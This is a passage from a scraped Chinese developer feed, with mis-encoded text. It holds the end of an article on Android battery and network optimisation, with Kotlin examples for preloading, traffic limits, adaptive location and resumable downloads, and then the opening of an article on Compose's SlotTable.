        NetworkQuality.MODERATE -&gt; <span class="hljs-string">"<span class="hljs-subst">${imageUrl}</span>?quality=medium"</span>
        NetworkQuality.POOR, NetworkQuality.VERY_POOR -&gt; <span class="hljs-string">"<span class="hljs-subst">${imageUrl}</span>?quality=low"</span>
    }

    Glide.with(imageView.context)
        .load(url)
        .diskCacheStrategy(DiskCacheStrategy.ALL)
        .placeholder(R.drawable.placeholder)
        .error(R.drawable.error)
        .into(imageView)
}
</code></pre>
<h3 data-id="heading-55">4. é¢„åŠ è½½ç­–ç•¥</h3>
<p>åœ¨WiFiç¯å¢ƒä¸‹é¢„åŠ è½½å¯èƒ½éœ€è¦çš„èµ„æº:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PreloadManager</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: Context) {

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">preloadIfNeeded</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">if</span> (isWiFiConnected() &amp;&amp; !isBatterySaveMode()) {
            lifecycleScope.launch {
                <span class="hljs-comment">// é¢„åŠ è½½ä»Šæ—¥æ¨èæ–‡ç« </span>
                preloadArticles()
                <span class="hljs-comment">// é¢„åŠ è½½è§†é¢‘å°é¢</span>
                preloadVideoThumbnails()
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isWiFiConnected</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">val</span> cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) <span class="hljs-keyword">as</span> ConnectivityManager
        <span class="hljs-keyword">val</span> network = cm.activeNetwork ?: <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        <span class="hljs-keyword">val</span> capabilities = cm.getNetworkCapabilities(network) ?: <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        <span class="hljs-keyword">return</span> capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isBatterySaveMode</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">val</span> pm = context.getSystemService(Context.POWER_SERVICE) <span class="hljs-keyword">as</span> PowerManager
        <span class="hljs-keyword">return</span> pm.isPowerSaveMode
    }
}
</code></pre>
<h3 data-id="heading-56">5. æµé‡æ§åˆ¶</h3>
<p>é™åˆ¶åå°æµé‡ä½¿ç”¨:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficController</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> maxDailyTraffic = <span class="hljs-number">50</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024L</span>  <span class="hljs-comment">// 50MB</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> prefs = context.getSharedPreferences(<span class="hljs-string">"traffic"</span>, Context.MODE_PRIVATE)

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">canUseNetwork</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">val</span> today = getToday()
        <span class="hljs-keyword">val</span> usedTraffic = prefs.getLong(<span class="hljs-string">"traffic_<span class="hljs-variable">$today</span>"</span>, <span class="hljs-number">0</span>)
        <span class="hljs-keyword">return</span> usedTraffic &lt; maxDailyTraffic
    }

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">recordTraffic</span><span class="hljs-params">(bytes: <span class="hljs-type">Long</span>)</span></span> {
        <span class="hljs-keyword">val</span> today = getToday()
        <span class="hljs-keyword">val</span> used = prefs.getLong(<span class="hljs-string">"traffic_<span class="hljs-variable">$today</span>"</span>, <span class="hljs-number">0</span>)
        prefs.edit().putLong(<span class="hljs-string">"traffic_<span class="hljs-variable">$today</span>"</span>, used + bytes).apply()
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getToday</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">return</span> SimpleDateFormat(<span class="hljs-string">"yyyyMMdd"</span>, Locale.getDefault()).format(Date())
    }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bce758b62794b54ab1daad8b51551d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769001863&amp;x-signature=48vgeO4hJtp%2FkOV6DJCm0NHm1%2Fk%3D" alt="14-07-network-optimization-strategies.png" loading="lazy"/></p>
<h2 data-id="heading-57">å®æˆ˜æ¡ˆä¾‹</h2>
<h3 data-id="heading-58">æ¡ˆä¾‹1: åå°å®šä½ä»»åŠ¡ç”µé‡ä¼˜åŒ–</h3>
<p><strong>é—®é¢˜</strong>: åœ°å›¾åº”ç”¨åå°æŒç»­å®šä½å¯¼è‡´ç”µé‡æ¶ˆè€—ä¸¥é‡ã€‚</p>
<p><strong>ä¼˜åŒ–å‰</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ æŒç»­é«˜ç²¾åº¦å®šä½</span>
locationManager.requestLocationUpdates(
    LocationManager.GPS_PROVIDER,
    <span class="hljs-number">1000L</span>,  <span class="hljs-comment">// 1ç§’æ›´æ–°ä¸€æ¬¡</span>
    <span class="hljs-number">0f</span>,
    locationListener
)
</code></pre>
<p><strong>ç”µé‡æ¶ˆè€—</strong>: 30%/å°æ—¶</p>
<p><strong>ä¼˜åŒ–å</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… åŠ¨æ€è°ƒæ•´å®šä½ç­–ç•¥</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartLocationManager</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: Context) {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> locationManager = context.getSystemService(Context.LOCATION_SERVICE) <span class="hljs-keyword">as</span> LocationManager
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> powerManager = context.getSystemService(Context.POWER_SERVICE) <span class="hljs-keyword">as</span> PowerManager

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startSmartLocationUpdates</span><span class="hljs-params">(listener: <span class="hljs-type">LocationListener</span>)</span></span> {
        <span class="hljs-keyword">val</span> (interval, provider) = getOptimalLocationStrategy()

        locationManager.requestLocationUpdates(
            provider,
            interval,
            <span class="hljs-number">0f</span>,
            listener
        )
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getOptimalLocationStrategy</span><span class="hljs-params">()</span></span>: Pair&lt;<span class="hljs-built_in">Long</span>, String&gt; {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
            <span class="hljs-comment">// çœç”µæ¨¡å¼:ä½¿ç”¨ç½‘ç»œå®šä½,30ç§’æ›´æ–°</span>
            powerManager.isPowerSaveMode -&gt; {
                <span class="hljs-number">30_000L</span> to LocationManager.NETWORK_PROVIDER
            }
            <span class="hljs-comment">// å‰å°è¿è¡Œ:ä½¿ç”¨GPS,5ç§’æ›´æ–°</span>
            isAppInForeground() -&gt; {
                <span class="hljs-number">5_000L</span> to LocationManager.GPS_PROVIDER
            }
            <span class="hljs-comment">// åå°è¿è¡Œ:ä½¿ç”¨ç½‘ç»œå®šä½,5åˆ†é’Ÿæ›´æ–°</span>
            <span class="hljs-keyword">else</span> -&gt; {
                <span class="hljs-number">300_000L</span> to LocationManager.NETWORK_PROVIDER
            }
        }
    }
}
</code></pre>
<p><strong>ä¼˜åŒ–ç»“æœ</strong>:</p>
<ul>
<li>ç”µé‡æ¶ˆè€—é™è‡³ <strong>8%/å°æ—¶</strong></li>
<li>å‡å°‘äº† <strong>73%</strong> çš„ç”µé‡æ¶ˆè€—</li>
<li>ç”¨æˆ·ç»­èˆªæ—¶é—´æå‡ <strong>3å€</strong></li>
</ul>
<h3 data-id="heading-59">æ¡ˆä¾‹2: å¼±ç½‘ç¯å¢ƒä¸‹è½½ä¼˜åŒ–</h3>
<p><strong>é—®é¢˜</strong>: åœ¨åœ°é“ç­‰å¼±ç½‘ç¯å¢ƒä¸‹,æ–‡ä»¶ä¸‹è½½ç»å¸¸å¤±è´¥ã€‚</p>
<p><strong>ä¼˜åŒ–å‰</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ å•æ¬¡ä¸‹è½½,å¤±è´¥åä»å¤´å¼€å§‹</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">downloadFile</span><span class="hljs-params">(url: <span class="hljs-type">String</span>, outputFile: <span class="hljs-type">File</span>)</span></span> {
    URL(url).openStream().use { input -&gt;
        FileOutputStream(outputFile).use { output -&gt;
            input.copyTo(output)
        }
    }
}
</code></pre>
<p><strong>æˆåŠŸç‡</strong>: å¼±ç½‘ä¸‹åªæœ‰ <strong>40%</strong></p>
<p><strong>ä¼˜åŒ–å</strong> - å®ç°æ–­ç‚¹ç»­ä¼ :</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… æ”¯æŒæ–­ç‚¹ç»­ä¼ çš„ä¸‹è½½å™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ResumableDownloader</span> {

    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">downloadWithResume</span><span class="hljs-params">(
        url: <span class="hljs-type">String</span>,
        outputFile: <span class="hljs-type">File</span>,
        maxRetries: <span class="hljs-type">Int</span> = <span class="hljs-number">5</span>
    )</span></span>: Result&lt;File&gt; = withContext(Dispatchers.IO) {
        <span class="hljs-keyword">var</span> retryCount = <span class="hljs-number">0</span>
        <span class="hljs-keyword">var</span> lastException: Exception? = <span class="hljs-literal">null</span>

        <span class="hljs-keyword">while</span> (retryCount &lt; maxRetries) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> downloaded = <span class="hljs-keyword">if</span> (outputFile.exists()) outputFile.length() <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>

                <span class="hljs-keyword">val</span> connection = URL(url).openConnection() <span class="hljs-keyword">as</span> HttpURLConnection
                connection.requestMethod = <span class="hljs-string">"GET"</span>

                <span class="hljs-comment">// è®¾ç½®æ–­ç‚¹ç»­ä¼ </span>
                <span class="hljs-keyword">if</span> (downloaded &gt; <span class="hljs-number">0</span>) {
                    connection.setRequestProperty(<span class="hljs-string">"Range"</span>, <span class="hljs-string">"bytes=<span class="hljs-variable">$downloaded</span>-"</span>)
                    Log.d(<span class="hljs-string">"Download"</span>, <span class="hljs-string">"ä» <span class="hljs-variable">$downloaded</span> å­—èŠ‚ç»§ç»­ä¸‹è½½"</span>)
                }

                <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒæ–­ç‚¹ç»­ä¼ </span>
                <span class="hljs-keyword">val</span> responseCode = connection.responseCode
                <span class="hljs-keyword">if</span> (responseCode != HttpURLConnection.HTTP_OK &amp;&amp;
                    responseCode != HttpURLConnection.HTTP_PARTIAL) {
                    <span class="hljs-keyword">return</span><span class="hljs-symbol">@withContext</span> Result.failure(IOException(<span class="hljs-string">"æœåŠ¡å™¨ä¸æ”¯æŒæ–­ç‚¹ç»­ä¼ "</span>))
                }

                <span class="hljs-comment">// ä¸‹è½½æ•°æ®</span>
                connection.inputStream.use { input -&gt;
                    FileOutputStream(outputFile, <span class="hljs-literal">true</span>).use { output -&gt;  <span class="hljs-comment">// append=true</span>
                        <span class="hljs-keyword">val</span> buffer = ByteArray(<span class="hljs-number">8192</span>)
                        <span class="hljs-keyword">var</span> bytesRead: <span class="hljs-built_in">Int</span>
                        <span class="hljs-keyword">var</span> totalBytes = downloaded

                        <span class="hljs-keyword">while</span> (input.read(buffer).also { bytesRead = it } != -<span class="hljs-number">1</span>) {
                            output.write(buffer, <span class="hljs-number">0</span>, bytesRead)
                            totalBytes += bytesRead

                            <span class="hljs-comment">// æ›´æ–°è¿›åº¦</span>
                            <span class="hljs-keyword">val</span> progress = (totalBytes * <span class="hljs-number">100</span> / connection.contentLength).toInt()
                            Log.d(<span class="hljs-string">"Download"</span>, <span class="hljs-string">"ä¸‹è½½è¿›åº¦: <span class="hljs-variable">$progress</span>%"</span>)
                        }
                    }
                }

                connection.disconnect()
                <span class="hljs-keyword">return</span><span class="hljs-symbol">@withContext</span> Result.success(outputFile)

            } <span class="hljs-keyword">catch</span> (e: Exception) {
                lastException = e
                retryCount++
                Log.w(<span class="hljs-string">"Download"</span>, <span class="hljs-string">"ä¸‹è½½å¤±è´¥,é‡è¯• <span class="hljs-variable">$retryCount</span>/<span class="hljs-variable">$maxRetries</span>"</span>, e)

                <span class="hljs-comment">// æŒ‡æ•°é€€é¿</span>
                delay(<span class="hljs-number">1000</span> * (<span class="hljs-number">1</span> shl retryCount))
            }
        }

        Result.failure(lastException ?: IOException(<span class="hljs-string">"ä¸‹è½½å¤±è´¥"</span>))
    }
}
</code></pre>
<p><strong>ä¼˜åŒ–ç»“æœ</strong>:</p>
<ul>
<li>æˆåŠŸç‡æå‡è‡³ <strong>95%</strong></li>
<li>å¹³å‡ä¸‹è½½æ—¶é—´å‡å°‘ <strong>60%</strong>(å‡å°‘é‡å¤ä¸‹è½½)</li>
<li>ç”¨æˆ·ä½“éªŒæ˜¾è‘—æ”¹å–„</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f95eddb3104246e0b377e6bda022cb13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769001863&amp;x-signature=9JDBm5wZPoH%2F2N%2BtwK4ZViEuMpg%3D" alt="14-08-optimization-comparison.png" loading="lazy"/></p>
<h2 data-id="heading-60">æ€»ç»“</h2>
<p>ç”µé‡ä¼˜åŒ–å’Œç½‘ç»œä¼˜åŒ–æ˜¯Androidåº”ç”¨æ€§èƒ½ä¼˜åŒ–ä¸­è‡³å…³é‡è¦çš„ä¸¤ä¸ªæ–¹å‘,å®ƒä»¬ç›´æ¥å½±å“ç”¨æˆ·ä½“éªŒå’Œåº”ç”¨å£ç¢‘ã€‚</p>
<h3 data-id="heading-61">æ ¸å¿ƒè¦ç‚¹å›é¡¾</h3>
<p><strong>ç”µé‡ä¼˜åŒ–</strong>:</p>
<ul>
<li>ç†è§£Dozeæ¨¡å¼å’ŒApp Standbyæœºåˆ¶,ä½¿ç”¨JobScheduler/WorkManageré€‚é…</li>
<li>ä½¿ç”¨Battery Historianåˆ†æç”µé‡æ¶ˆè€—,å®šä½å¼‚å¸¸</li>
<li>é¿å…Wakelockæ»¥ç”¨,å§‹ç»ˆè®¾ç½®è¶…æ—¶æ—¶é—´</li>
<li>ä¼˜åŒ–å®šä½ç­–ç•¥,æ ¹æ®åœºæ™¯åŠ¨æ€è°ƒæ•´</li>
<li>å‡å°‘åå°ç½‘ç»œè¯·æ±‚,åˆå¹¶ä»»åŠ¡</li>
</ul>
<p><strong>ç½‘ç»œä¼˜åŒ–</strong>:</p>
<ul>
<li>è¯†åˆ«å¼±ç½‘ç¯å¢ƒ,åŠ¨æ€è°ƒæ•´è¶…æ—¶å’Œé‡è¯•ç­–ç•¥</li>
<li>å®ç°æ™ºèƒ½é™çº§,ä¿è¯å¼±ç½‘ä¸‹çš„åŸºæœ¬å¯ç”¨æ€§</li>
<li>ä½¿ç”¨æ•°æ®å‹ç¼©ã€è¯·æ±‚åˆå¹¶å‡å°‘æµé‡</li>
<li>å¯ç”¨HTTP/2è¿æ¥å¤ç”¨</li>
<li>å®ç°ç¦»çº¿ç¼“å­˜å’Œæ–­ç‚¹ç»­ä¼ </li>
</ul>
<h3 data-id="heading-62">ä¼˜åŒ–æ£€æŸ¥æ¸…å•</h3>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> åå°ä»»åŠ¡ä½¿ç”¨WorkManagerè°ƒåº¦</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> ä¸ºWakelockè®¾ç½®è¶…æ—¶æ—¶é—´</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å®šä½æœåŠ¡æ ¹æ®å‰åå°åŠ¨æ€è°ƒæ•´</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> ç½‘ç»œè¯·æ±‚è®¾ç½®åˆç†è¶…æ—¶</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å®ç°æŒ‡æ•°é€€é¿é‡è¯•æœºåˆ¶</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å¼±ç½‘ä¸‹å¯ç”¨é™çº§ç­–ç•¥</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å¯ç”¨è¯·æ±‚å“åº”å‹ç¼©</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> ä½¿ç”¨OkHttpç¼“å­˜æœºåˆ¶</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> WiFiç¯å¢ƒä¸‹é¢„åŠ è½½èµ„æº</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> ä½¿ç”¨Battery Historianå®šæœŸåˆ†æ</li>
</ul>
<hr/>
<h2 data-id="heading-63">å‚è€ƒèµ„æ–™</h2>
<p><strong>å®˜æ–¹èµ„æ–™</strong>ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Fperformance%2Fpower" target="_blank" title="https://developer.android.com/topic/performance/power" ref="nofollow noopener noreferrer">Androidç”µé‡ä¼˜åŒ–å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle%2Fbattery-historian" target="_blank" title="https://github.com/google/battery-historian" ref="nofollow noopener noreferrer">Battery Historianä½¿ç”¨æŒ‡å—</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftraining%2Fmonitoring-device-state%2Fdoze-standby" target="_blank" title="https://developer.android.com/training/monitoring-device-state/doze-standby" ref="nofollow noopener noreferrer">Dozeæ¨¡å¼æœ€ä½³å®è·µ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Flibraries%2Farchitecture%2Fworkmanager" target="_blank" title="https://developer.android.com/topic/libraries/architecture/workmanager" ref="nofollow noopener noreferrer">WorkManagerå¼€å‘æŒ‡å—</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsquare.github.io%2Fokhttp%2F" target="_blank" title="https://square.github.io/okhttp/" ref="nofollow noopener noreferrer">OkHttpå®˜æ–¹æ–‡æ¡£</a></li>
</ul>
<p><strong>ç³»åˆ—æ–‡ç« </strong>:</p>
<ul>
<li><a href="https://juejin.cn/post/7594680314712866866" target="_blank" title="https://juejin.cn/post/7594680314712866866">ä¸Šä¸€ç¯‡ï¼šCPUä¸I/Oæ€§èƒ½ä¼˜åŒ–:Simpleperfä¸å­˜å‚¨ä¼˜åŒ–å®æˆ˜</a></li>
<li><a href="https://juejin.cn/post/7587473691170095104" target="_blank" title="https://juejin.cn/post/7587473691170095104">ç³»åˆ—ç›®å½•: Androidç³»ç»Ÿç¨³å®šæ€§ä¸æ€§èƒ½ä¼˜åŒ–</a></li>
</ul>
<blockquote>
<p><strong>ä½œè€…ç®€ä»‹</strong>: å¤šå¹´Androidç³»ç»Ÿå¼€å‘ç»éªŒ,ä¸“æ³¨äºç³»ç»Ÿç¨³å®šæ€§ä¸æ€§èƒ½ä¼˜åŒ–é¢†åŸŸã€‚æ¬¢è¿å…³æ³¨æœ¬ç³»åˆ—,ä¸€èµ·æ·±å…¥Androidç³»ç»Ÿçš„ç²¾å½©ä¸–ç•Œ!</p>
</blockquote>
<hr/>
<h3 data-id="heading-64">ğŸ‰ æ„Ÿè°¢å…³æ³¨,è®©æˆ‘ä»¬ä¸€èµ·æ·±å…¥Androidç³»ç»Ÿçš„ç²¾å½©ä¸–ç•Œ!</h3>
<h3 data-id="heading-65"><strong>æ‰¾åˆ°æˆ‘</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a></h3></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ComposeåŸç†ä¸‰ä¹‹SlotTable]]></title>    <link>https://juejin.cn/post/7595043440520265734</link>    <guid>https://juejin.cn/post/7595043440520265734</guid>    <pubDate>2026-01-14T15:05:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043440520265734" data-draft-id="7592069432228134921" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ComposeåŸç†ä¸‰ä¹‹SlotTable"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-14T15:05:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è£´äº‘é£"/> <meta itemprop="url" content="https://juejin.cn/user/3734361144570285"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ComposeåŸç†ä¸‰ä¹‹SlotTable
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3734361144570285/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è£´äº‘é£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T15:05:41.000Z" title="Wed Jan 14 2026 15:05:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‰è¨€</h2>
<p><strong>SlotTableæ˜¯Composeçš„æ ¸å¿ƒæ•°æ®ç»“æ„ï¼Œå®ƒè§£å†³äº†å£°æ˜å¼UIä¸­çš„å…³é”®é—®é¢˜ã€‚æŒæ¡äº†SlotTableï¼Œå°±æŒæ¡äº†Composeçš„æ ¸å¿ƒåŸç†ã€‚</strong></p>
<h2 data-id="heading-1">äºŒã€å°æ¡ˆä¾‹</h2>
<p>æˆ‘ä»¬ä»¥ä¸€ä¸ªç®€å•çš„è®¡æ•°å™¨ä¸ºä¾‹ï¼Œåˆ†åˆ«ç”¨ä¼ ç»Ÿå‡½æ•°å’ŒComposeå‡½æ•°æ¥è¯´æ˜SlotTableçš„ä½œç”¨ã€‚</p>
<h3 data-id="heading-2">2ã€1 ä¼ ç»Ÿå‡½æ•°ï¼ˆæ— çŠ¶æ€ï¼Œæ— æ³•è®°å¿†ï¼‰</h3>
<p>åœ¨ä¼ ç»Ÿå‡½æ•°ä¸­ï¼Œå‡½æ•°è°ƒç”¨æ—¶åˆ›å»ºå±€éƒ¨å˜é‡ï¼Œè°ƒç”¨ç»“æŸå°±é”€æ¯ã€‚æ— æ³•åœ¨å¤šæ¬¡è°ƒç”¨ä¸­ä¿æŒçŠ¶æ€ã€‚</p>
